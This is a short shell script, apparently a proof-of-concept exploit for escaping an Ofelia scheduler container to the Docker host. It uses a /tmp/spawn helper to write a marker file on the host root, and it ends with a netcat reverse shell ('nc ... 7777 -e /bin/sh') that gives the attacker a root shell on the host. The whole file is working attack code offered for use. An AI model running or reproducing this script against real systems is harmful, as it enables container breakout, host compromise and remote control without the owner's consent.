#!/bin/sh
#Writes in Ofelia daemon container
touch /hi.lol
#Writes to docker host root
/tmp/spawn -c "touch /rooted.lol" -d
#Optional reverse shell from root docker host
#Change to your container's IP
ip=172.16.0.2
/tmp/spawn -c "nc ${ip} 7777 -e /bin/sh"
